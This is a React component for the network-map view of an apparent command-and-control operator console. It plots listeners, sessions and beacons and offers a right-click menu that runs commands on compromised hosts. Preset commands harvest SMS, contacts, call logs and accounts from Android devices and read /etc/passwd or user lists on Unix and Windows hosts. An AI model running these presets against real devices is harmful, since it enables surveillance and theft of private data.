import { useEffect, useRef, useState, useCallback } from 'react'
import { useAPI, apiPost, apiFetch, apiDelete } from '../hooks/useAPI'
import type { Session, Beacon, Listener } from '../types'
import { Map as MapIcon, RefreshCw, ZoomIn, ZoomOut, Maximize2, Loader,
         Terminal, Send, Skull, FolderOpen, Smartphone, MessageSquare,
         Package, Wifi, Users, Info, X } from 'lucide-react'

// ─── Node types ───────────────────────────────────────────────────────────────

interface Node {
  id:    string
  label: string
  type:  'c2' | 'session' | 'beacon' | 'listener'
  os?:   string
  x:     number
  y:     number
}

interface Link { from: string; to: string; label?: string }

// ─── Context menu ─────────────────────────────────────────────────────────────

interface CtxState {
  node:      Node
  sessionId?: string
  beaconId?:  string
  isAndroid:  boolean
  x: number
  y: number
}

// ─── Colours ──────────────────────────────────────────────────────────────────

const NODE_COLORS = {
  c2:       '#00ff88',
  session:  '#00d4ff',
  beacon:   '#ffaa00',
  listener: '#aa88ff',
}
const NODE_RADIUS = { c2: 24, session: 18, beacon: 16, listener: 14 }
const OS_ICON: Record<string, string> = {
  windows: '🪟', linux: '🐧', macos: '🍎', darwin: '🍎', android: '🤖',
}

// ─── Android quick‑actions for context menu ───────────────────────────────────

const CTX_ANDROID = [
  { icon: '📱', label: 'Device Info',  cmd: 'id && uname -a && hostname' },
  { icon: '💬', label: 'SMS Inbox',    cmd: "content query --uri content://sms/inbox --projection address:body:date 2>/dev/null | head -60 || echo 'no-access'" },
  { icon: '👥', label: 'Contacts',     cmd: "content query --uri content://contacts/phones/ --projection display_name:number 2>/dev/null | head -60 || echo 'no-access'" },
  { icon: '📞', label: 'Call Log',     cmd: "content query --uri content://call_log/calls --projection number:date:type:duration 2>/dev/null | head -40 || echo 'no-access'" },
  { icon: '📦', label: 'Installed Apps', cmd: 'pm list packages -3 2>/dev/null' },
  { icon: '📂', label: 'SD Card',      cmd: 'ls -la /sdcard/' },
  { icon: '📸', label: 'DCIM',         cmd: 'ls -la /sdcard/DCIM/' },
  { icon: '📥', label: 'Downloads',    cmd: 'ls -la /sdcard/Download/' },
  { icon: '📶', label: 'WiFi Info',    cmd: "dumpsys wifi 2>/dev/null | grep -E 'mWifiInfo|SSID|IP address|DNS' | head -20 || ip addr" },
  { icon: '🔋', label: 'Battery',      cmd: 'dumpsys battery 2>/dev/null | head -20' },
  { icon: '👤', label: 'Accounts',     cmd: "dumpsys account 2>/dev/null | grep -E 'Account \\{|type=' | head -30" },
]

const CTX_UNIX = [
  { icon: '👤', label: 'id',         cmd: 'id' },
  { icon: '🖥️', label: 'uname -a',   cmd: 'uname -a' },
  { icon: '🌐', label: 'ip addr',    cmd: 'ip addr show' },
  { icon: '🔌', label: 'netstat',    cmd: 'ss -tulpn 2>/dev/null || netstat -tulpn' },
  { icon: '📋', label: 'ps aux',     cmd: 'ps aux' },
  { icon: '🔑', label: '/etc/passwd',cmd: 'cat /etc/passwd' },
  { icon: '⚙️', label: 'sudo -l',   cmd: 'sudo -l 2>&1' },
  { icon: '💾', label: 'disk',       cmd: 'df -h' },
]

const CTX_WIN = [
  { icon: '👤', label: 'whoami',     cmd: 'cmd.exe /c whoami /all' },
  { icon: '🌐', label: 'ipconfig',   cmd: 'cmd.exe /c ipconfig /all' },
  { icon: '📋', label: 'tasklist',   cmd: 'cmd.exe /c tasklist' },
  { icon: '🔌', label: 'netstat',    cmd: 'cmd.exe /c netstat -ano' },
  { icon: '👥', label: 'net user',   cmd: 'cmd.exe /c net user' },
  { icon: '💻', label: 'systeminfo', cmd: 'cmd.exe /c systeminfo' },
  { icon: '⚙️', label: 'services',  cmd: 'cmd.exe /c sc query type= all' },
  { icon: '📂', label: 'dir C:\\',   cmd: 'cmd.exe /c dir C:\\' },
]

// ─── Component ────────────────────────────────────────────────────────────────

interface Props { onOpenTerminal: (sessionId: string, name: string) => void }

export default function NetworkMap({ onOpenTerminal }: Props) {
  const { data: sessions,  refresh: rS } = useAPI<Session[]>('/api/sessions',  10_000)
  const { data: beacons,   refresh: rB } = useAPI<Beacon[]>('/api/beacons',    10_000)
  const { data: listeners, refresh: rL } = useAPI<Listener[]>('/api/listeners', 10_000)

  const svgRef    = useRef<SVGSVGElement>(null)
  const [scale,   setScale]   = useState(1)
  const [offset,  setOffset]  = useState({ x: 0, y: 0 })
  const [drag,    setDrag]    = useState<{ sx: number; sy: number; ox: number; oy: number } | null>(null)
  const [tooltip, setTooltip] = useState<{ node: Node; px: number; py: number } | null>(null)

  // ── Context menu state ────────────────────────────────────────────────────
  const [ctx,       setCtx]       = useState<CtxState | null>(null)
  const [ctxResult, setCtxResult] = useState<string | null>(null)
  const [ctxLoading,setCtxLoading]= useState(false)
  const [ctxCmd,    setCtxCmd]    = useState('')

  function refresh() { rS(); rB(); rL() }

  // ── Build nodes + links ──────────────────────────────────────────────────
  const W = 800, H = 500
  const cx = W / 2, cy = H / 2

  const nodes: Node[] = []
  const links: Link[] = []

  nodes.push({ id: 'c2', label: 'SUDOSOC-C2', type: 'c2', x: cx, y: cy })

  const lstList = listeners ?? []
  lstList.forEach((l, i) => {
    const angle = (i / Math.max(lstList.length, 1)) * Math.PI - Math.PI / 2
    const r = 120
    const node: Node = {
      id:    `lst-${l.id}`,
      label: `${l.protocol?.toUpperCase() ?? '?'}:${l.port}`,
      type:  'listener',
      x: cx + r * Math.cos(angle),
      y: cy - 60 + r * Math.sin(angle),
    }
    nodes.push(node)
    links.push({ from: 'c2', to: node.id, label: l.protocol })
  })

  const sessList = sessions ?? []
  sessList.forEach((s, i) => {
    const angle = (i / Math.max(sessList.length, 1)) * 2 * Math.PI - Math.PI / 2
    const r = 200
    const node: Node = {
      id:    `ses-${s.id}`,
      label: s.name,
      type:  'session',
      os:    s.os?.toLowerCase(),
      x: cx + r * Math.cos(angle),
      y: cy + r * Math.sin(angle),
    }
    nodes.push(node)
    links.push({ from: 'c2', to: node.id, label: s.transport })
  })

  const beaconList = beacons ?? []
  beaconList.forEach((b, i) => {
    const angle = (i / Math.max(beaconList.length, 1)) * 2 * Math.PI
    const r = 290
    const node: Node = {
      id:    `bea-${b.id}`,
      label: b.name,
      type:  'beacon',
      os:    b.os?.toLowerCase(),
      x: cx + r * Math.cos(angle),
      y: cy + r * Math.sin(angle),
    }
    nodes.push(node)
    links.push({ from: 'c2', to: node.id })
  })

  const nodeMap = new Map(nodes.map(n => [n.id, n]))

  // ── Context menu execute ─────────────────────────────────────────────────
  const ctxExecute = useCallback(async (cmd: string) => {
    if (!ctx?.sessionId) return
    setCtxLoading(true)
    setCtxResult(null)
    try {
      const res = await apiPost<{ stdout: string; stderr: string; exit_code: number }>(
        `/api/sessions/${ctx.sessionId}/execute`, { command: cmd }
      )
      const out = res.stdout || res.stderr || '(no output)'
      setCtxResult(out.slice(0, 2000) + (out.length > 2000 ? '\n…(truncated)' : ''))
    } catch (e) {
      setCtxResult(`Error: ${String(e)}`)
    } finally {
      setCtxLoading(false)
    }
  }, [ctx])

  async function ctxKill() {
    if (!ctx?.sessionId) return
    if (!confirm(`Kill session ${ctx.node.label}?`)) return
    try { await apiDelete(`/api/sessions/${ctx.sessionId}/kill`) } catch {}
    setCtx(null)
    refresh()
  }

  // ── Mouse handlers ────────────────────────────────────────────────────────
  function onSvgMouseDown(e: React.MouseEvent) {
    if ((e.target as SVGElement).tagName === 'svg' || (e.target as SVGElement).tagName === 'g') {
      setDrag({ sx: e.clientX, sy: e.clientY, ox: offset.x, oy: offset.y })
      setTooltip(null)
    }
  }
  function onMouseMove(e: React.MouseEvent) {
    if (!drag) return
    setOffset({ x: drag.ox + (e.clientX - drag.sx), y: drag.oy + (e.clientY - drag.sy) })
  }
  function onMouseUp() { setDrag(null) }

  function onNodeClick(node: Node, e: React.MouseEvent) {
    e.stopPropagation()
    if (ctx) { setCtx(null); return }
    setTooltip({ node, px: e.clientX, py: e.clientY })
  }

  function onNodeRightClick(node: Node, e: React.MouseEvent) {
    e.preventDefault()
    e.stopPropagation()
    setTooltip(null)
    const sessionId = node.id.startsWith('ses-') ? node.id.slice(4) : undefined
    const beaconId  = node.id.startsWith('bea-') ? node.id.slice(4) : undefined
    const isAndroid = !!(node.os?.includes('android'))
    setCtx({ node, sessionId, beaconId, isAndroid, x: e.clientX, y: e.clientY })
    setCtxResult(null)
    setCtxCmd('')
  }

  // Close ctx on outside click
  function onCanvasClick() {
    setTooltip(null)
    setCtx(null)
  }

  const totalNodes = nodes.length - 1

  const ctxActions = ctx?.isAndroid ? CTX_ANDROID : ctx?.node.os?.includes('windows') ? CTX_WIN : CTX_UNIX

  return (
    <div className="flex flex-col gap-4 h-full">

      {/* ── Header ─────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-primary font-bold text-lg flex items-center gap-2">
            <MapIcon size={18} /> Network Map
          </h2>
          <p className="text-muted text-xs mt-1">
            {sessList.length} sessions · {beaconList.length} beacons · {lstList.length} listeners
            <span className="ml-2 text-primary/60">· Right-click any node for actions</span>
          </p>
        </div>
        <div className="flex items-center gap-2">
          <button onClick={() => setScale(s => Math.min(s + 0.2, 2))}
            className="p-1.5 rounded border border-border text-muted hover:text-text"><ZoomIn size={14} /></button>
          <button onClick={() => setScale(s => Math.max(s - 0.2, 0.3))}
            className="p-1.5 rounded border border-border text-muted hover:text-text"><ZoomOut size={14} /></button>
          <button onClick={() => { setScale(1); setOffset({ x: 0, y: 0 }) }}
            className="p-1.5 rounded border border-border text-muted hover:text-text"><Maximize2 size={14} /></button>
          <button onClick={refresh}
            className="flex items-center gap-1 text-muted hover:text-text text-xs px-2 py-1 rounded border border-border">
            <RefreshCw size={12} /> Refresh
          </button>
        </div>
      </div>

      {/* ── Legend ─────────────────────────────────────────────────── */}
      <div className="flex flex-wrap gap-4 text-[10px]">
        {Object.entries(NODE_COLORS).map(([type, color]) => (
          <div key={type} className="flex items-center gap-1.5">
            <div className="w-3 h-3 rounded-full" style={{ background: color }} />
            <span className="text-muted capitalize">{type}</span>
          </div>
        ))}
        <span className="text-muted">Right-click → actions · Drag to pan · ±buttons to zoom</span>
      </div>

      {/* ── SVG Canvas ─────────────────────────────────────────────── */}
      <div className="flex-1 min-h-0 rounded-lg border border-border bg-surface overflow-hidden relative cursor-grab active:cursor-grabbing"
        onClick={onCanvasClick}
        onContextMenu={e => e.preventDefault()}>
        <svg ref={svgRef} className="w-full h-full select-none"
          onMouseDown={onSvgMouseDown} onMouseMove={onMouseMove}
          onMouseUp={onMouseUp} onMouseLeave={onMouseUp}>
          <defs>
            <marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
              <path d="M0,0 L0,6 L8,3 z" fill="#333355" />
            </marker>
          </defs>

          <g transform={`translate(${offset.x}, ${offset.y}) scale(${scale})`}>

            {/* Links */}
            {links.map((lk, i) => {
              const from = nodeMap.get(lk.from)
              const to   = nodeMap.get(lk.to)
              if (!from || !to) return null
              const mx = (from.x + to.x) / 2
              const my = (from.y + to.y) / 2
              return (
                <g key={i}>
                  <line x1={from.x} y1={from.y} x2={to.x} y2={to.y}
                    stroke="#222244" strokeWidth="1.5" markerEnd="url(#arrow)"
                    strokeDasharray={to.type === 'beacon' ? '4 3' : undefined} />
                  {lk.label && (
                    <text x={mx} y={my - 4} textAnchor="middle" fontSize="9" fill="#555577">{lk.label}</text>
                  )}
                </g>
              )
            })}

            {/* Nodes */}
            {nodes.map(node => {
              const r     = NODE_RADIUS[node.type]
              const color = NODE_COLORS[node.type]
              const icon  = node.os ? (OS_ICON[node.os] ?? '💻') : (node.type === 'c2' ? '🖥️' : '📡')
              const isCtxTarget = ctx?.node.id === node.id
              return (
                <g key={node.id}
                  onClick={e => onNodeClick(node, e)}
                  onContextMenu={e => onNodeRightClick(node, e)}
                  className="cursor-pointer">
                  {node.type === 'c2' && (
                    <circle cx={node.x} cy={node.y} r={r + 6} fill="none" stroke="#00ff88" strokeWidth="1" opacity="0.3" />
                  )}
                  {/* Highlight ring when selected */}
                  {isCtxTarget && (
                    <circle cx={node.x} cy={node.y} r={r + 5} fill="none"
                      stroke={color} strokeWidth="2" opacity="0.8"
                      style={{ animation: 'none' }} />
                  )}
                  <circle cx={node.x} cy={node.y} r={r}
                    fill={isCtxTarget ? color + '44' : color + '22'}
                    stroke={color} strokeWidth={isCtxTarget ? '2.5' : '1.5'} />
                  <text x={node.x} y={node.y - 1} textAnchor="middle" dominantBaseline="middle" fontSize={r * 0.9}>{icon}</text>
                  <text x={node.x} y={node.y + r + 10} textAnchor="middle" fontSize="9"
                    fill={node.type === 'c2' ? '#00ff88' : '#aaaacc'}
                    className="pointer-events-none">
                    {node.label.length > 14 ? node.label.slice(0, 12) + '…' : node.label}
                  </text>
                </g>
              )
            })}
          </g>
        </svg>

        {/* Empty state */}
        {totalNodes === 0 && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 pointer-events-none">
            <MapIcon size={40} className="text-border" />
            <p className="text-muted text-sm">No nodes yet</p>
            <p className="text-muted text-xs">Start a listener and deploy implants to see the network map</p>
          </div>
        )}

        {/* Hover tooltip (left-click) */}
        {tooltip && !ctx && (
          <div className="absolute z-10 bg-surface border border-border rounded-lg p-3 text-xs shadow-lg min-w-[160px]"
            style={{ left: Math.min(tooltip.px + 10, window.innerWidth - 200), top: Math.min(tooltip.py + 10, window.innerHeight - 150) }}
            onClick={e => e.stopPropagation()}>
            <div className="font-bold mb-1" style={{ color: NODE_COLORS[tooltip.node.type] }}>
              {tooltip.node.label}
            </div>
            <div className="text-muted text-[10px] uppercase tracking-widest mb-1">{tooltip.node.type}</div>
            {tooltip.node.os && <div className="text-muted">OS: {tooltip.node.os} {OS_ICON[tooltip.node.os]}</div>}
            <div className="text-muted text-[9px] mt-1 font-mono">{tooltip.node.id}</div>
            <div className="text-primary/60 text-[9px] mt-1">Right-click for actions</div>
          </div>
        )}

        {/* ── Right-click context menu ─────────────────────────────── */}
        {ctx && (
          <div
            className="absolute z-20 bg-[#0d0d1a] border border-primary/30 rounded-lg shadow-2xl overflow-hidden"
            style={{
              left:     Math.min(ctx.x, window.innerWidth  - 320),
              top:      Math.min(ctx.y, window.innerHeight - 500),
              width:    300,
              maxHeight: 520,
            }}
            onClick={e => e.stopPropagation()}
            onContextMenu={e => e.preventDefault()}>

            {/* Header */}
            <div className="flex items-center justify-between px-3 py-2 border-b border-border/60 bg-surface/50">
              <div>
                <span className="font-bold text-xs" style={{ color: NODE_COLORS[ctx.node.type] }}>
                  {ctx.node.os ? (OS_ICON[ctx.node.os] ?? '💻') : '📡'} {ctx.node.label}
                </span>
                <span className="text-muted text-[10px] ml-2">{ctx.node.os ?? ctx.node.type}</span>
              </div>
              <button onClick={() => setCtx(null)} className="text-muted hover:text-text">
                <X size={12} />
              </button>
            </div>

            <div className="overflow-y-auto" style={{ maxHeight: 460 }}>

              {/* ── Session actions ───────────────────────────── */}
              {ctx.sessionId && (
                <>
                  {/* Primary actions */}
                  <div className="p-2 flex flex-wrap gap-1 border-b border-border/40">
                    <button
                      onClick={() => { onOpenTerminal(ctx.sessionId!, ctx.node.label); setCtx(null) }}
                      className="flex items-center gap-1 px-2.5 py-1.5 rounded text-[11px] bg-primary/15 border border-primary/40 text-primary hover:bg-primary/25 transition-colors">
                      <Terminal size={11} /> Shell
                    </button>
                    <button
                      onClick={() => ctxExecute('ls ' + (ctx.isAndroid ? '/sdcard' : '/'))}
                      className="flex items-center gap-1 px-2.5 py-1.5 rounded text-[11px] bg-warn/15 border border-warn/40 text-warn hover:bg-warn/25 transition-colors">
                      <FolderOpen size={11} /> Files
                    </button>
                    <button
                      onClick={() => ctxKill()}
                      className="flex items-center gap-1 px-2.5 py-1.5 rounded text-[11px] bg-danger/15 border border-danger/40 text-danger hover:bg-danger/25 transition-colors">
                      <Skull size={11} /> Kill
                    </button>
                  </div>

                  {/* Quick execute input */}
                  <div className="px-2 pt-2 pb-1 border-b border-border/40">
                    <div className="flex gap-1">
                      <input
                        value={ctxCmd}
                        onChange={e => setCtxCmd(e.target.value)}
                        onKeyDown={e => { if (e.key === 'Enter' && ctxCmd.trim()) ctxExecute(ctxCmd) }}
                        placeholder="Execute command…"
                        className="flex-1 bg-bg border border-border rounded px-2 py-1 text-[11px] font-mono text-text placeholder-muted focus:border-primary outline-none"
                      />
                      <button
                        onClick={() => ctxCmd.trim() && ctxExecute(ctxCmd)}
                        disabled={ctxLoading || !ctxCmd.trim()}
                        className="px-2 py-1 rounded bg-primary/15 border border-primary/40 text-primary hover:bg-primary/25 disabled:opacity-40 transition-colors">
                        {ctxLoading ? <Loader size={11} className="animate-spin" /> : <Send size={11} />}
                      </button>
                    </div>
                  </div>

                  {/* OS-specific quick actions */}
                  <div className="p-2 border-b border-border/40">
                    <div className="text-[9px] text-muted uppercase tracking-widest mb-1.5 flex items-center gap-1">
                      {ctx.isAndroid ? <Smartphone size={9} /> : <Info size={9} />}
                      {ctx.isAndroid ? 'Android Actions' : ctx.node.os?.includes('windows') ? 'Windows Actions' : 'Linux Actions'}
                    </div>
                    <div className="grid grid-cols-2 gap-1">
                      {ctxActions.map(a => (
                        <button key={a.label}
                          onClick={() => ctxExecute(a.cmd)}
                          disabled={ctxLoading}
                          className="flex items-center gap-1.5 px-2 py-1.5 rounded text-[10px] bg-surface border border-border/60 text-text hover:border-primary/50 hover:bg-primary/5 transition-colors disabled:opacity-40 text-left">
                          <span>{a.icon}</span>
                          <span className="truncate">{a.label}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Result output */}
                  {(ctxResult !== null || ctxLoading) && (
                    <div className="p-2">
                      <div className="text-[9px] text-muted uppercase tracking-widest mb-1">Output</div>
                      {ctxLoading ? (
                        <div className="flex items-center gap-2 text-muted text-[11px]">
                          <Loader size={11} className="animate-spin" /> Executing…
                        </div>
                      ) : (
                        <pre className="text-[10px] font-mono text-text bg-bg rounded p-2 overflow-auto whitespace-pre-wrap break-all"
                          style={{ maxHeight: 180 }}>
                          {ctxResult}
                        </pre>
                      )}
                    </div>
                  )}
                </>
              )}

              {/* ── Beacon (no shell, info only) ──────────────── */}
              {ctx.beaconId && !ctx.sessionId && (
                <div className="p-3 text-xs text-muted">
                  <div className="font-semibold text-text mb-1">Beacon</div>
                  <p>Beacons check in on a schedule. Use the Beacons tab to queue tasks.</p>
                </div>
              )}

              {/* ── Listener / C2 info ────────────────────────── */}
              {!ctx.sessionId && !ctx.beaconId && (
                <div className="p-3 text-xs text-muted">
                  <div className="text-[9px] uppercase tracking-widest mb-1">{ctx.node.type}</div>
                  <div className="font-mono text-text">{ctx.node.label}</div>
                  {ctx.node.os && <div className="mt-1">OS: {ctx.node.os}</div>}
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
